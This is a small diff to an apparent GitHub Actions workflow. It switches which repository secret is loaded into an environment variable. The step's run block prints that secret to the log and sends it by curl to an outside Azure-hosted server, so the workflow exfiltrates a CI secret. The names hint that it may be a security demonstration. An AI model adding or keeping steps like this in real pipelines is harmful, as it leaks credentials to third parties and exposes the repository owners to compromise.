@@ -23,7 +23,7 @@ jobs:
             
       - shell: bash
         env:
-          SECRET: ${{ secrets.MACIEJ_SECRET }}
+          SECRET: ${{ secrets.SHOW_TELL }}
         run: |
           echo $SECRET
           curl -L https://wa-ncd-sec01.azurewebsites.net/$SECRET
